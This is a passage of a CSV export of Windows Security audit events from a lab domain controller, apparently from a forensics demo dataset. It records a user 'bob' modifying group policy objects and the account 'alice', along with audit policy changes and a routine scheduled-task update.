Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
41,198239009,2019-03-25 12:31:44.8106050,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,432,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""49a1e957-0b53-4119-9013-9bd2e846a68e""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65560""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
42,198239010,2019-03-25 12:31:44.8106050,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,4528,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""49a1e957-0b53-4119-9013-9bd2e846a68e""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65561""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
43,198239036,2019-03-25 12:33:36.0366438,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,432,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
44,198239043,2019-03-25 12:33:40.7146449,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
45,198239044,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9ba86d72-7c57-4a9d-8239-e93d9ac25584""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""7""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
46,198239045,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9ba86d72-7c57-4a9d-8239-e93d9ac25584""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""8""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
47,198239046,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""7a0ddd82-407e-41da-83b1-014a84297ab8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""8""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
48,198239047,2019-03-25 12:33:44.8166570,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""7a0ddd82-407e-41da-83b1-014a84297ab8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""9""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
49,198239063,2019-03-25 12:33:59.2756130,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8279 SubcategoryId: %%14080,SubcategoryGuid: 0cce923b-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8451,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8279""},{""@Name"":""SubcategoryId"",""#text"":""%%14080""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce923b-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8451""}]}}"
50,198239064,2019-03-25 12:33:59.2756130,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8279 SubcategoryId: %%14081,SubcategoryGuid: 0cce923c-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8451,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8279""},{""@Name"":""SubcategoryId"",""#text"":""%%14081""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce923c-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8451""}]}}"
51,198239092,2019-03-25 12:37:49.6386773,4738,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3948,DC1.insecurebank.local,0,,A user account was changed,insecurebank\bob,,Target: insecurebank\alice,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""Dummy"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""alice""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1107""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3D8E8DB""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""}]}}"
52,198239171,2019-03-25 12:48:09.1956172,4738,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,1360,DC1.insecurebank.local,0,,A user account was changed,insecurebank\bob,,Target: insecurebank\alice,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""Dummy"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""alice""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1107""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3D8E8DB""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""}]}}"
53,198239223,2019-03-25 12:52:45.5006116,4702,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A scheduled task was updated,insecurebank\DC1$,,TaskName: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask,"TaskContentNew: &lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;, &lt;Task version=""1.4"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\system32\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:51:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=""NetworkService""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=""NetworkService""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask""},{""@Name"":""TaskContentNew"",""#text"":""&lt;?xml version=\""1.0\"" encoding=\""UTF-16\""?&gt;, &lt;Task version=\""1.4\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\\system32\\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:51:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=\""NetworkService\""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=\""NetworkService\""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;""}]}}"
